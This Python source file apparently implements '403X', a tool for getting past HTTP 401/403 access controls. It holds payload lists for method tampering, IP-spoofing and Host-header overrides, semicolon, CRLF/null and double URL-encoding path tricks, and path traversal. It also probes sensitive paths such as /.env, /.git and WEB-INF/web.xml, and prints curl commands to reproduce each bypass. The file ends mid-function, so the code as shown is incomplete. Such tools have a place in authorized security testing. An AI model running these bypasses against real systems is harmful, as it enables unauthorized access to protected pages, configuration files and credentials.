#!/usr/bin/env python3
# 403X 
# Author: Vahe Demirkhanyan

import argparse
import requests
import sys
import random
import time
import re
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple, Any
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, quote
import urllib3
import colorama
from colorama import Fore, Style
import socket
from threading import Lock
import http.client

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Initialize colorama (only once)
colorama.init(autoreset=True)

# ---------------- DATA MODELS -----------------
@dataclass
class BypassResult:
    """Represents a successful bypass result"""
    method: str
    url: str
    status_code: int
    content_length: int
    payload: str = ""
    
    def __hash__(self):
        return hash((self.method, self.url, self.status_code))
    
    def __eq__(self, other):
        if not isinstance(other, BypassResult):
            return False
        return (self.method, self.url, self.status_code) == (other.method, other.url, other.status_code)

@dataclass
class BypassContext:
    """Context object to pass around instead of globals"""
    original_url: str
    parsed_url: Any
    domain: str
    path: str
    is_https: bool
    args: argparse.Namespace
    session: requests.Session
    baseline: Dict[str, Any] = field(default_factory=dict)
    successful_bypasses: List[BypassResult] = field(default_factory=list)
    session_lock: Lock = field(default_factory=Lock)
    pool: Optional[ThreadPoolExecutor] = None
    
    def add_bypass(self, result: BypassResult):
        """Thread-safe method to add bypass results"""
        with self.session_lock:
            if result not in self.successful_bypasses:
                self.successful_bypasses.append(result)
    
    def print_safe(self, message: str):
        """Thread-safe printing"""
        with self.session_lock:
            print(message)

# ---------------- UTILITY FUNCTIONS -----------------
def banner():
    """Display the tool banner"""
    print(f"{Fore.CYAN}╔══════════════════════════════════════════════════════╗")
    print(f"║ {Fore.GREEN}403X{Fore.CYAN} - Advanced Access Restriction Bypass Tool ║")
    print(f"║ {Fore.YELLOW}The ultimate tool for bypassing 401/403 restrictions{Fore.CYAN}  ║")
    print(f"║ {Fore.RED}Enhanced with advanced evasion techniques{Fore.CYAN}        ║")
    print(f"╚══════════════════════════════════════════════════════╝{Style.RESET_ALL}")

def load_resource(filename):
    """Load resource file contents"""
    try:
        with open(filename, 'r') as file:
            return [line.strip() for line in file if line.strip() and not line.startswith('#')]
    except FileNotFoundError:
        if filename in ["headers.txt", "paths.txt", "payloads.txt", "user_agents.txt", "endpaths.txt"]:
            return []  # Silent fail for optional resource files
        print(f"{Fore.RED}[!] Error: Resource file '{filename}' not found")
        return []

def create_session() -> requests.Session:
    """Create a new HTTP session with default settings"""
    session = requests.Session()
    session.verify = False
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                     "AppleWebKit/537.36 (KHTML, like Gecko) "
                     "Chrome/91.0.4472.124 Safari/537.36"
    })
    return session

def make_request(ctx: BypassContext, url: str, method: str = "GET", 
                headers: Optional[Dict] = None, allow_redirects: bool = True, 
                timeout: int = None, data: Any = None, http_version: Optional[str] = None) -> Optional[requests.Response]:
    """Make an HTTP request and return the response"""
    try:
        headers = headers or {}
        if "User-Agent" not in headers:
            headers["User-Agent"] = ctx.session.headers['User-Agent']
        
        if ctx.args.verbose:
            ctx.print_safe(f"{Fore.YELLOW}[*] Attempting request to: {url}{Style.RESET_ALL}")
            ctx.print_safe(f"{Fore.YELLOW}[*] Method: {method}, Headers: {headers}{Style.RESET_ALL}")
        
        proxies = None
        if ctx.args.proxy:
            proxies = {"http": ctx.args.proxy, "https": ctx.args.proxy}
        
        # Handle HTTP/1.0 request
        if http_version == "1.0":
            # Store original values
            orig_vsn = http.client.HTTPConnection._http_vsn
            orig_vsn_str = http.client.HTTPConnection._http_vsn_str
            
            # Force HTTP/1.0
            http.client.HTTPConnection._http_vsn = 10
            http.client.HTTPConnection._http_vsn_str = 'HTTP/1.0'
            
            try:
                # Create a new session for HTTP/1.0
                temp_session = create_session()
                with ctx.session_lock:
                    response = temp_session.request(
                        method=method,
                        url=url,
                        headers=headers,
                        allow_redirects=allow_redirects,
                        timeout=timeout or ctx.args.timeout,
                        verify=False,
                        data=data,
                        proxies=proxies
                    )
                return response
            finally:
                # Restore original values
                http.client.HTTPConnection._http_vsn = orig_vsn
                http.client.HTTPConnection._http_vsn_str = orig_vsn_str
        else:
            # Normal request with thread safety
            timeout = timeout or ctx.args.timeout
            
            with ctx.session_lock:
                response = ctx.session.request(
                    method=method,
                    url=url,
                    headers=headers,
                    allow_redirects=allow_redirects,
                    timeout=timeout,
                    verify=False,
                    data=data,
                    proxies=proxies
                )
            return response
        
    except requests.exceptions.SSLError as e:
        if ctx.args.verbose:
            ctx.print_safe(f"{Fore.RED}[!] SSL Error: {str(e)}{Style.RESET_ALL}")
        return None
    except requests.exceptions.ConnectionError as e:
        if ctx.args.verbose:
            ctx.print_safe(f"{Fore.RED}[!] Connection Error: {str(e)}{Style.RESET_ALL}")
        return None
    except requests.exceptions.Timeout as e:
        if ctx.args.verbose:
            ctx.print_safe(f"{Fore.RED}[!] Timeout Error: {str(e)}{Style.RESET_ALL}")
        return None
    except requests.exceptions.RequestException as e:
        if ctx.args.verbose:
            ctx.print_safe(f"{Fore.RED}[!] Request Exception: {str(e)}{Style.RESET_ALL}")
        return None
    except Exception as e:
        if ctx.args.verbose:
            ctx.print_safe(f"{Fore.RED}[!] Unexpected Error: {type(e).__name__}: {str(e)}{Style.RESET_ALL}")
        return None

def test_dns_resolution(hostname):
    """Test if the hostname resolves to an IP address"""
    try:
        if re.match(r'^\d+\.\d+\.\d+\.\d+$', hostname):
            print(f"{Fore.GREEN}[+] Target is an IP address: {hostname}{Style.RESET_ALL}")
            return True
        
        ip = socket.gethostbyname(hostname)
        print(f"{Fore.GREEN}[+] Hostname {hostname} resolves to {ip}{Style.RESET_ALL}")
        return True
    except socket.gaierror:
        print(f"{Fore.RED}[!] Failed to resolve hostname: {hostname}{Style.RESET_ALL}")
        return False

def test_baseline(ctx: BypassContext) -> Dict[str, Any]:
    """Probe the target and establish baseline response"""
    print(f"{Fore.YELLOW}[*] Testing baseline response...{Style.RESET_ALL}")
    
    url = ctx.original_url
    parsed = urlparse(url)
    response = None
    
    # Try the request with increasing timeouts
    for i in range(1, 4):
        timeout = ctx.args.timeout * i
        print(f"{Fore.YELLOW}[*] Connection attempt {i}/3 (timeout: {timeout}s) → {url}{Style.RESET_ALL}")
        response = make_request(ctx, url, timeout=timeout)
        if response:
            break
    
    # If HTTPS to IP failed, try HTTP
    if response is None and parsed.scheme == "https" and re.match(r"^\d+\.\d+\.\d+\.\d+$", parsed.netloc):
        print(f"{Fore.YELLOW}[*] HTTPS failed – trying plain HTTP...{Style.RESET_ALL}")
        http_url = url.replace("https://", "http://", 1)
        
        for i in range(1, 4):
            timeout = ctx.args.timeout * i
            response = make_request(ctx, http_url, timeout=timeout)
            if response:
                # Update context with HTTP URL
                ctx.original_url = http_url
                ctx.parsed_url = urlparse(http_url)
                ctx.path = ctx.parsed_url.path
                ctx.is_https = False
                break
    
    if response is None:
        print(f"{Fore.RED}[!] Failed to connect to target after multiple attempts.{Style.RESET_ALL}")
        sys.exit(1)
    
    status_code = response.status_code
    content_length = len(response.content)
    
    print(f"{Fore.BLUE}[+] Baseline Response: Status {status_code}, Length: {content_length}{Style.RESET_ALL}")
    
    if status_code == 200 and not ctx.args.continue_if_ok:
        print(f"{Fore.GREEN}[+] Target already returns 200 OK – no bypass needed. "
              f"Use --continue-if-ok to force further tests.{Style.RESET_ALL}")
        sys.exit(0)
    elif status_code in (401, 403):
        print(f"{Fore.YELLOW}[*] Perfect – got {status_code}. Starting bypass techniques…{Style.RESET_ALL}")
    
    baseline = {
        "status_code": status_code,
        "content_length": content_length,
        "body": response.text,
    }
    ctx.baseline = baseline
    return baseline

def report_bypass(ctx: BypassContext, method: str, url: str, status_code: int, 
                 content_length: int, payload: str = ""):
    """Report a successful bypass"""
    if status_code < 400:
        success_marker = f"{Fore.GREEN}[+] BYPASS FOUND"
        result = BypassResult(
            method=method,
            url=url,
            status_code=status_code,
            content_length=content_length,
            payload=payload
        )
        ctx.add_bypass(result)
    else:
        success_marker = f"{Fore.RED}[x] Failed"
        if ctx.args.verbose:
            ctx.print_safe(f"{success_marker} [{method}] Status: {status_code}, Length: {content_length} - {url}")
            if payload:
                ctx.print_safe(f"{Fore.CYAN}    Payload: {payload}{Style.RESET_ALL}")
        return
    
    ctx.print_safe(f"{success_marker} [{method}] Status: {status_code}, Length: {content_length} - {url}")
    if payload and status_code < 400:
        ctx.print_safe(f"{Fore.CYAN}    Payload: {payload}{Style.RESET_ALL}")
        print_curl_command(ctx, url, method, payload)

def print_curl_command(ctx: BypassContext, url: str, method_name: str, payload: str):
    """Print a curl command to reproduce the successful bypass"""
    method = "GET"
    headers = {}
    
    if method_name.startswith("HTTP-METHOD-"):
        method = method_name.replace("HTTP-METHOD-", "")
    
    if method_name == "HTTP-HEADER" and ":" in payload:
        header_name, header_value = payload.split(":", 1)
        headers[header_name.strip()] = header_value.strip()
    
    curl_cmd = f"curl -k -s '{url}'"
    
    for header, value in headers.items():
        curl_cmd += f" -H '{header}: {value}'"
    
    if method != "GET":
        curl_cmd += f" -X {method}"
    
    ctx.print_safe(f"{Fore.YELLOW}    Reproduce: {curl_cmd}{Style.RESET_ALL}")

def generate_ip_variations():
    """Generate various IP format representations"""
    variations = []
    
    # Localhost variations
    localhost_ips = [
        "127.0.0.1", "localhost", "0.0.0.0", "127.1", "127.0.1",
        "2130706433", "0x7F000001", "0177.0.0.1", "0177.1",
        "::1", "0:0:0:0:0:0:0:1", "[::]", "[::1]",
    ]
    
    # Private ranges
    private_ips = [
        "10.0.0.1", "192.168.1.1", "172.16.0.1",
        "10.0.0.0", "192.168.0.1", "172.16.1.1"
    ]
    
    # Add format variations
    base_ips = ["127.0.0.1", "10.0.0.1", "192.168.1.1"]
    for ip in base_ips:
        octets = ip.split('.')
        # Decimal
        decimal = sum(int(octet) << (8 * (3 - i)) for i, octet in enumerate(octets))
        variations.append(str(decimal))
        # Hex
        hex_ip = "0x" + "".join(f"{int(octet):02X}" for octet in octets)
        variations.append(hex_ip)
        # Octal
        octal_ip = ".".join(f"0{int(octet):o}" if int(octet) > 0 else "0" for octet in octets)
        variations.append(octal_ip)
    
    variations.extend(localhost_ips)
    variations.extend(private_ips)
    
    return list(set(variations))

def random_case_method(method: str) -> List[str]:
    """Generate random case permutations of HTTP methods"""
    cases = []
    if len(method) <= 6:
        # Generate all combinations
        for i in range(min(2**len(method), 64)):  # Cap at 64 to prevent explosion
            case_method = ""
            for j, char in enumerate(method):
                if (i >> j) & 1:
                    case_method += char.upper()
                else:
                    case_method += char.lower()
            if case_method not in cases:
                cases.append(case_method)
        return cases[:10]
    else:
        # For longer methods, generate random variations
        cases = [method.lower(), method.upper()]
        attempts = 0
        while len(cases) < 10 and attempts < 50:
            case_method = ''.join(random.choice([c.upper(), c.lower()]) for c in method)
            if case_method not in cases:
                cases.append(case_method)
            attempts += 1
        return cases

# ---------------- BYPASS TECHNIQUES -----------------

def http_method_bypass(ctx: BypassContext):
    """Try different HTTP methods to bypass restrictions"""
    ctx.print_safe(f"\n{Fore.BLUE}[*] Testing HTTP Method Bypasses (Enhanced)...{Style.RESET_ALL}")
    
    methods = [
        "GET", "POST", "HEAD", "OPTIONS", "PUT", "DELETE", "TRACE", "CONNECT", "PATCH", 
        "PROPFIND", "PROPPATCH", "MKCOL", "COPY", "MOVE", "LOCK", "UNLOCK", "LINK", 
        "UNLINK", "PURGE", "VIEW", "TRACK", "DEBUG", "MERGE", "UPDATE",
        "LABEL", "UNCHECKOUT", "VERSION-CONTROL", "CHECKOUT", "REPORT", "MKWORKSPACE",
        "MKACTIVITY", "BASELINE-CONTROL", "MERGE", "BIND", "UNBIND", "REBIND",
        "INVENTED", "CUSTOM", "BYPASS", "ADMIN", "TEST", "PING", "STATUS"
    ]
    
    if ctx.args.fast:
        methods = methods[:20]
    
    # Test standard methods
    futures_map = {}
    for method in methods:
        future = ctx.pool.submit(make_request, ctx, ctx.original_url, method)
        futures_map[future] = method
    
    for future in as_completed(futures_map):
        method = futures_map[future]
        response = future.result()
        if response:
            report_bypass(ctx, f"HTTP-METHOD-{method}", ctx.original_url, 
                        response.status_code, len(response.content))
    
    # Test case permutations
    ctx.print_safe(f"\n{Fore.BLUE}[*] Testing Case-Permuted HTTP Methods...{Style.RESET_ALL}")
    common_methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"]
    
    if ctx.args.fast:
        common_methods = common_methods[:4]
    
    case_futures_map = {}
    for method in common_methods:
        case_variations = random_case_method(method)
        for case_method in case_variations:
            if case_method != method:
                future = ctx.pool.submit(make_request, ctx, ctx.original_url, case_method)
                case_futures_map[future] = case_method
    
    for future in as_completed(case_futures_map):
        case_method = case_futures_map[future]
        response = future.result()
        if response:
            report_bypass(ctx, f"HTTP-METHOD-CASE-{case_method}", ctx.original_url, 
                        response.status_code, len(response.content))

def protocol_version_bypass(ctx: BypassContext):
    """Try HTTP version quirks to bypass restrictions"""
    ctx.print_safe(f"\n{Fore.BLUE}[*] Testing Protocol Version Bypasses...{Style.RESET_ALL}")
    
    response = make_request(ctx, ctx.original_url, http_version="1.0")
    if response:
        report_bypass(ctx, "HTTP-VERSION-1.0", ctx.original_url, 
                     response.status_code, len(response.content), "Forced HTTP/1.0")

def http_header_bypass(ctx: BypassContext):
    """Try different HTTP headers to bypass restrictions"""
    ctx.print_safe(f"\n{Fore.BLUE}[*] Testing HTTP Header Bypasses (Enhanced)...{Style.RESET_ALL}")
    
    ip_variations = generate_ip_variations()
    
    base_headers = [
        "X-Forwarded-For", "X-Forwarded-Host", "X-Forwarded-Proto", "X-Forwarded-Scheme",
        "X-Real-IP", "X-Client-IP", "X-Remote-Addr", "X-Originating-IP", "X-Host",
        "X-Custom-IP-Authorization", "X-Original-Host", "X-Originally-Forwarded-For",
        "True-Client-IP", "CF-Connecting_IP", "CF-Connecting-IP", "X-ProxyUser-Ip",
        "Base-Url", "Client-IP", "Http-Url", "Proxy-Host", "Proxy-Url", "Real-Ip",
        "Redirect", "Referrer", "Request-Uri", "Uri", "Url", "X-Forward-For",
        "X-Forwarded-By", "X-Forwarded-For-Original", "X-Forwarded-Server", "X-Forwarded",
        "X-Forwarder-For", "X-Http-Destinationurl", "X-Http-Host-Override",
        "X-Original-Remote-Addr", "X-Proxy-Url", "X-Real-Ip", "X-Remote-Addr",
        "Forwarded", "Forwarded-For", "Forwarded-For-Ip", "X-Forward", "Forward-For",
        "X-Forwarded-Port", "X-Forwarded-Protocol", "X-Forwarded-Ssl",
        "X-Url-Scheme", "Front-End-Https", "X-Forwarded-Https"
    ]
    
    if ctx.args.fast:
        base_headers = base_headers[:10]
        ip_variations = ip_variations[:5]
    
    base_request_headers = {"User-Agent": ctx.session.headers['User-Agent']}
    
    # Test Host header override
    ctx.print_safe(f"\n{Fore.BLUE}[*] Testing Host Header Overrides...{Style.RESET_ALL}")
    host_values = ["localhost", "127.0.0.1", "admin.localhost", "internal", "backend"]
    
    futures_map = {}
    for host_val in host_values:
        custom_headers = base_request_headers.copy()
        custom_headers["Host"] = host_val
        future = ctx.pool.submit(make_request, ctx, ctx.original_url, headers=custom_headers)
        futures_map[future] = ("Host", host_val)
    
    for future in as_completed(futures_map):
        header_type, value = futures_map[future]
        response = future.result()
        if response:
            report_bypass(ctx, "HTTP-HEADER-HOST", ctx.original_url, 
                        response.status_code, len(response.content), f"Host: {value}")
    
    # Test IP spoofing headers
    ctx.print_safe(f"\n{Fore.BLUE}[*] Testing IP Spoofing Headers with Multiple Formats...{Style.RESET_ALL}")
    
    ip_futures_map = {}
    for header_name in base_headers[:15]:
        for ip_val in ip_variations[:10]:
            custom_headers = base_request_headers.copy()
            custom_headers[header_name] = ip_val
            future = ctx.pool.submit(make_request, ctx, ctx.original_url, headers=custom_headers)
            ip_futures_map[future] = (header_name, ip_val)
    
    for future in as_completed(ip_futures_map):
        header_name, ip_val = ip_futures_map[future]
        response = future.result()
        if response:
            report_bypass(ctx, "HTTP-HEADER-IP-SPOOF", ctx.original_url, 
                        response.status_code, len(response.content), f"{header_name}: {ip_val}")
    
    # Test other headers
    headers_list = load_resource("headers.txt")
    if not headers_list:
        headers_list = [
            f"X-Original-URL: {ctx.path}",
            f"X-Rewrite-URL: {ctx.path}",
            f"X-Original-URL: /{ctx.path}",
            f"X-WAP-Profile: http://{ctx.domain}",
            f"X-Arbitrary: http://{ctx.domain}",
            f"X-HTTP-DestinationURL: http://{ctx.domain}",
            "Destination: 127.0.0.1",
            "Proxy: 127.0.0.1",
            f"Referer: {ctx.original_url}",
            "Content-Length: 0",
            "X-OReferrer: https%3A%2F%2Fwww.google.com%2F"
        ]
    
    if ctx.args.fast:
        headers_list = headers_list[:15]
    
    header_futures_map = {}
    for header in headers_list:
        if ":" in header:
            header_name, header_value = header.split(":", 1)
            custom_headers = base_request_headers.copy()
            custom_headers[header_name.strip()] = header_value.strip()
            future = ctx.pool.submit(make_request, ctx, ctx.original_url, headers=custom_headers)
            header_futures_map[future] = (header_name.strip(), header_value.strip())
    
    for future in as_completed(header_futures_map):
        header_name, header_value = header_futures_map[future]
        response = future.result()
        if response:
            report_bypass(ctx, "HTTP-HEADER", ctx.original_url, 
                        response.status_code, len(response.content), f"{header_name}: {header_value}")

def advanced_path_manipulation(ctx: BypassContext):
    """Advanced path manipulation techniques"""
    ctx.print_safe(f"\n{Fore.BLUE}[*] Testing Advanced Path Manipulation...{Style.RESET_ALL}")
    
    if not ctx.path or ctx.path == "/":
        ctx.print_safe(f"{Fore.YELLOW}[!] No significant path for advanced manipulation.{Style.RESET_ALL}")
        return
    
    base_url = f"{ctx.parsed_url.scheme}://{ctx.parsed_url.netloc}"
    
    # Encoded leading slash variations
    ctx.print_safe(f"\n{Fore.BLUE}[*] Testing Encoded Leading Slash...{Style.RESET_ALL}")
    encoded_slashes = ["%2e", "%2f", "%ef%bc%8f"]
    
    futures_map = {}
    for enc_slash in encoded_slashes:
        target_url = f"{base_url}/{enc_slash}{ctx.path.lstrip('/')}"
        future = ctx.pool.submit(make_request, ctx, target_url)
        futures_map[future] = target_url
    
    for future in as_completed(futures_map):
        target_url = futures_map[future]
        response = future.result()
        if response:
            report_bypass(ctx, "ENCODED-LEADING-SLASH", target_url, 
                        response.status_code, len(response.content))
    
    # Semicolon variations
    ctx.print_safe(f"\n{Fore.BLUE}[*] Testing Semicolon Variations...{Style.RESET_ALL}")
    semicolon_patterns = [
        f";{ctx.path}",
        f"{ctx.path};",
        f";/{ctx.path.lstrip('/')}",
        f"{ctx.path};/",
        f";%2f{ctx.path.lstrip('/')}",
        f";/%2e%2e{ctx.path}",
        f"%3b{ctx.path}",
        f"{ctx.path}%3b"
    ]
    
    if ctx.args.fast:
        semicolon_patterns = semicolon_patterns[:5]
    
    semicolon_futures = {}
    for pattern in semicolon_patterns:
        target_url = f"{base_url}{pattern}"
        future = ctx.pool.submit(make_request, ctx, target_url)
        semicolon_futures[future] = target_url
    
    for future in as_completed(semicolon_futures):
        target_url = semicolon_futures[future]
        response = future.result()
        if response:
            report_bypass(ctx, "SEMICOLON-BYPASS", target_url, 
                        response.status_code, len(response.content))
    
    # Other tests
    trailing_dot_url = f"{ctx.original_url}/."
    response = make_request(ctx, trailing_dot_url)
    if response:
        report_bypass(ctx, "TRAILING-DOT", trailing_dot_url, 
                     response.status_code, len(response.content))
    
    wildcard_url = f"{base_url}/*{ctx.path.lstrip('/')}"
    response = make_request(ctx, wildcard_url)
    if response:
        report_bypass(ctx, "WILDCARD-PREFIX", wildcard_url, 
                     response.status_code, len(response.content))
    
    # CRLF and NULL combinations
    ctx.print_safe(f"\n{Fore.BLUE}[*] Testing CRLF/NULL Path Injection...{Style.RESET_ALL}")
    crlf_null_patterns = [
        "%0d", "%0a", "%00", "%09",
        "%0d%0a", "%00%0d", "%09%0a",
        "/%0d", "/%0a", "/%00", "/%09",
        "%0d/", "%0a/", "%00/", "%09/"
    ]
    
    if ctx.args.fast:
        crlf_null_patterns = crlf_null_patterns[:6]
    
    path_parts = ctx.path.strip('/').split('/')
    crlf_futures = {}
    for i, part in enumerate(path_parts):
        for pattern in crlf_null_patterns:
            if len(part) > 2:
                mid = len(part) // 2
                modified_part = part[:mid] + pattern + part[mid:]
                new_path_parts = path_parts.copy()
                new_path_parts[i] = modified_part
                target_path = '/' + '/'.join(new_path_parts)
                target_url = f"{base_url}{target_path}"
                
                future = ctx.pool.submit(make_request, ctx, target_url)
                crlf_futures[future] = target_url
    
    # Limit number of results to avoid overwhelming output
    count = 0
    for future in as_completed(crlf_futures):
        if count >= 50:  # Limit results for performance
            break
        target_url = crlf_futures[future]
        response = future.result()
        if response:
            report_bypass(ctx, "CRLF-NULL-INJECTION", target_url, 
                        response.status_code, len(response.content))
            count += 1

def exhaustive_case_permutation(ctx: BypassContext):
    """Generate exhaustive case permutations for path segments"""
    ctx.print_safe(f"\n{Fore.BLUE}[*] Testing Exhaustive Case Permutations...{Style.RESET_ALL}")
    
    if not ctx.path or ctx.path == "/":
        return
    
    base_url = f"{ctx.parsed_url.scheme}://{ctx.parsed_url.netloc}"
    path_parts = ctx.path.strip('/').split('/')
    
    case_futures = {}
    for part_idx, part in enumerate(path_parts):
        if len(part) <= 6 and len(part) > 1:
            case_combinations = []
            max_combinations = 32 if not ctx.args.fast else 16
            
            for j in range(min(2**len(part), max_combinations)):
                case_part = ""
                for k, char in enumerate(part):
                    if (j >> k) & 1:
                        case_part += char.upper()
                    else:
                        case_part += char.lower()
                if case_part != part and case_part not in case_combinations:
                    case_combinations.append(case_part)
            
            limit = 10 if not ctx.args.fast else 5
            for case_part in case_combinations[:limit]:
                new_path_parts = path_parts.copy()
                new_path_parts[part_idx] = case_part
                target_path = '/' + '/'.join(new_path_parts)
                target_url = f"{base_url}{target_path}"
                
                future = ctx.pool.submit(make_request, ctx, target_url)
                case_futures[future] = target_url
    
    for future in as_completed(case_futures):
        target_url = case_futures[future]
        response = future.result()
        if response:
            report_bypass(ctx, "EXHAUSTIVE-CASE", target_url, 
                        response.status_code, len(response.content))

def double_url_encoding_sweep(ctx: BypassContext):
    """Per-character double URL encoding sweep"""
    ctx.print_safe(f"\n{Fore.BLUE}[*] Testing Double URL Encoding Sweep...{Style.RESET_ALL}")
    
    if not ctx.path or ctx.path == "/":
        return
    
    base_url = f"{ctx.parsed_url.scheme}://{ctx.parsed_url.netloc}"
    path_parts = ctx.path.strip('/').split('/')
    
    encoding_futures = {}
    for i, part in enumerate(path_parts):
        if len(part) > 1:
            char_limit = len(part) if not ctx.args.fast else min(len(part), 5)
            for j in range(char_limit):
                char = part[j]
                if char.isalnum():
                    # Double URL encode
                    double_encoded = f"%25{ord(char):02X}"
                    modified_part = part[:j] + double_encoded + part[j+1:]
                    
                    new_path_parts = path_parts.copy()
                    new_path_parts[i] = modified_part
                    target_path = '/' + '/'.join(new_path_parts)
                    target_url = f"{base_url}{target_path}"
                    
                    future = ctx.pool.submit(make_request, ctx, target_url)
                    encoding_futures[future] = (target_url, "double")
                
                # Double encode dots
                if char == '.':
                    double_dot = "%252e"
                    modified_part = part[:j] + double_dot + part[j+1:]
                    
                    new_path_parts = path_parts.copy()
                    new_path_parts[i] = modified_part
                    target_path = '/' + '/'.join(new_path_parts)
                    target_url = f"{base_url}{target_path}"
                    
                    future = ctx.pool.submit(make_request, ctx, target_url)
                    encoding_futures[future] = (target_url, "dot")
    
    for future in as_completed(encoding_futures):
        target_url, encoding_type = encoding_futures[future]
        response = future.result()
        if response:
            if encoding_type == "dot":
                report_bypass(ctx, "DOUBLE-DOT-ENCODING", target_url, 
                            response.status_code, len(response.content))
            else:
                report_bypass(ctx, "DOUBLE-URL-ENCODING", target_url, 
                            response.status_code, len(response.content))

def protocol_scheme_bypass(ctx: BypassContext):
    """Try different protocol/scheme combinations to bypass restrictions"""
    ctx.print_safe(f"\n{Fore.BLUE}[*] Testing Protocol/Scheme Bypasses...{Style.RESET_ALL}")
    
    # Switch between HTTP and HTTPS
    if ctx.original_url.startswith("https"):
        alt_url = ctx.original_url.replace("https://", "http://")
    else:
        alt_url = ctx.original_url.replace("http://", "https://")
    
    response = make_request(ctx, alt_url)
    if response:
        report_bypass(ctx, "PROTOCOL-SCHEME", alt_url, 
                     response.status_code, len(response.content))
    
    # Try with X-Forwarded-Scheme headers
    for scheme in ["http", "https"]:
        headers = {"X-Forwarded-Scheme": scheme}
        response = make_request(ctx, ctx.original_url, headers=headers)
        if response:
            report_bypass(ctx, "PROTOCOL-SCHEME", ctx.original_url, 
                         response.status_code, len(response.content), f"X-Forwarded-Scheme: {scheme}")

def port_bypass(ctx: BypassContext):
    """Try different port specifications to bypass restrictions"""
    ctx.print_safe(f"\n{Fore.BLUE}[*] Testing Port Bypasses...{Style.RESET_ALL}")
    
    ports = ["80", "443", "8080", "8443", "8000", "8888", "4443"]
    
    if ctx.args.fast:
        ports = ports[:4]
    
    futures_map = {}
    # Test with X-Forwarded-Port header
    for port in ports:
        headers = {"X-Forwarded-Port": port}
        future = ctx.pool.submit(make_request, ctx, ctx.original_url, headers=headers)
        futures_map[future] = ("header", port)
    
    # Test URL with explicit port (only if not already specified)
    if ctx.parsed_url.port is None:
        for port in ports:
            port_url = f"{ctx.parsed_url.scheme}://{ctx.parsed_url.hostname}:{port}{ctx.parsed_url.path}"
            if ctx.parsed_url.query:
                port_url += f"?{ctx.parsed_url.query}"
            
            future = ctx.pool.submit(make_request, ctx, port_url)
            futures_map[future] = ("url", port_url)
    
    for future in as_completed(futures_map):
        kind, value = futures_map[future]
        response = future.result()
        if response:
            if kind == "header":
                report_bypass(ctx, "PORT", ctx.original_url, 
                            response.status_code, len(response.content), f"X-Forwarded-Port: {value}")
            else:
                report_bypass(ctx, "PORT", value, 
                            response.status_code, len(response.content))

def path_traversal_bypass(ctx: BypassContext):
    """Try path traversal techniques to bypass restrictions"""
    ctx.print_safe(f"\n{Fore.BLUE}[*] Testing Path Traversal Bypasses...{Style.RESET_ALL}")
    
    base_url = f"{ctx.parsed_url.scheme}://{ctx.parsed_url.netloc}"
    
    path_variations = load_resource("paths.txt")
    if not path_variations:
        path_variations = [
            "/../", "/..;/", "/.././", "/..//", "/../.;/", "/../;/", "/../%09/", "/../%20/",
            "/../%23/", "/../%0d/", "/../%2f/", "/../%5c/", "/./", "//./", "/.//",
            "/%2e/", "/%2e%2e/", "/%252e/", "/%252e%252e/", "/.%2e/", "/..%2f/",
            "/..%252f/", "/..%252f..%252f/", "/../", "/../../", "/../../../",
            "/../../..//", "/../..//", "/../..//../", "/../..;/", "/.././../",
            "/../.;/../", "/..//", "/..//../", "/..//../../", "/..//..;/",
            "/../;/", "/../;/../", "/..;/", "/..;/../", "/..;/..;/", "/..;//",
            "/..;//../", "/..;//..;/", "/..;/;/", "/..;/;/..;/", "/.//",
            "/admin", "/admin/", "/admin/login", "/login", "/auth", "/secure",
            "/dashboard", "/console", "/web-console", "/jmx-console", "/actuator",
            "/actuator/health", "/actuator/env", "/actuator/metrics", "/manager/html",
            "/host-manager/html", "/status", "/metrics", "/monitor", "/health",
            "/healthcheck", "/info", "/api", "/api/v1", "/api/v2", "/api/v1/users",
            "/rest", "/rest/v1", "/remote/login", "/graphql", "/v2/api-docs",
            "/swagger", "/swagger-ui", "/swagger-ui.html", "/openapi.json",
            "/openapi.yaml", "/docs", "/docs/index.html", "/h2-console",
            "/phpmyadmin", "/adminer", "/robots.txt", "/sitemap.xml", "/.env",
            "/.git", "/.svn", "/.hg", "/.DS_Store", "/WEB-INF", "/WEB-INF/web.xml",
            "/WEB-INF/web.xml%00"
]
    
    if ctx.args.fast:
        path_variations = path_variations[:20]
    
    # Add path-specific variations
    if ctx.path and ctx.path != "/":
        path_parts = ctx.path.strip('/').split('/')
        if len(path_parts) > 1:
            base_path = '/'.join(path_parts[:-1])
            last_part = path_parts[-1]
            
            additional_paths = [
                f"{last_part}/", f"{last_part}..;/", f"{last_part}/../",
                f"{last_part}/..;/", f"/{last_part}", f"/{base_path}/{last_part}%20",
                f"/{base_path}/{last_part}%09", f"/{base_path}//{last_part}",
                f"/{base_path}/./{last_part}", f"/{base_path}///{last_part}"
            ]
            path_variations.extend(additional_paths)
    
    futures_map = {}
    for path_var in path_variations:
        if ctx.path and ctx.path != "/":
            target_path = ctx.path.rstrip('/') + path_var
            target_url = f"{base_url}{target_path}"
        else:
            target_url = f"{base_url}{path_var}"
        
        future = ctx.pool.submit(make_request, ctx, target_url)
        futures_map[future] = target_url
    
    for future in as_completed(futures_map):
        target_url = futures_map[future]
        response = future.result()
        if response:
            report_bypass(ctx, "PATH-TRAVERSAL", target_url, 
                        response.status_code, len(response.content))

def url_encoding_bypass(ctx: BypassContext):
    """Try URL encoding variations to bypass restrictions"""
    ctx.print_safe(f"\n{Fore.BLUE}[*] Testing URL Encoding Bypasses...{Style.RESET_ALL}")
    
    base_url = f"{ctx.parsed_url.scheme}://{ctx.parsed_url.netloc}"
    
    encoding_variations = [
        "%2e%2e%2f", "%2e%2e/", "../%2f", "%2e%2e%5c", "%252e%252e%255c",
        "%252e%252e%252f", ".%2e/", "%2e./", "..%2f", ".%252e/", "%252e./",
        "..%252f", "..\\", "..%5c", "..%c0%af", "%c0%ae%c0%ae/", "%c0%ae%c0%ae%c0%af",
        "..%25%32%66", "..%%32f", "..%%32%66", "..%u2215", "..%c0%9v", "..%ef%bc%8f",
        "?", "#", "//%09/", "/%09/", "/%5c/", ";/%2f/", ";%09", "%20", "%23",
        "%2e", "%2f", "%3b", "%3f", "%26", "%0a", "%0d"
    ]
    
    if ctx.args.fast:
        encoding_variations = encoding_variations[:20]
    
    # Add combinations
    if not ctx.args.fast:
        combos = []
        for var1 in encoding_variations[:10]:
            for var2 in encoding_variations[:5]:
                if var1 != var2:
                    combos.append(var1 + var2)
